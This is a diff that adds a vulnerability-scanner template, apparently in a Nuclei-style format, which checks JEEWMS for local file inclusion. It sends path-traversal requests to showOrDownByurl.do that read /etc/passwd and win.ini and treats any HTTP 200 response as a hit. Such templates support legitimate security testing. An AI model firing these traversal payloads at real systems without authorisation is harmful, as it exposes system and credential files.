@@ -1,0 +1,30 @@
+id: jeewms-lfi
+brief:
+    title: JEEWMS - Local File Inclusion
+    by: pikpikcu
+    level: high
+    about: JEEWMS is vulnerable to local file inclusion.
+    label:
+        - jeewms
+        - lfi
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      signs:
+        - "on": status
+          status:
+            - 200
+    - verb: GET
+      to:
+        - '{{BaseURL}}/systemController/showOrDownByurl.do?down=&dbPath=../Windows/win.ini'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      signs:
+        - "on": status
+          status:
+            - 200
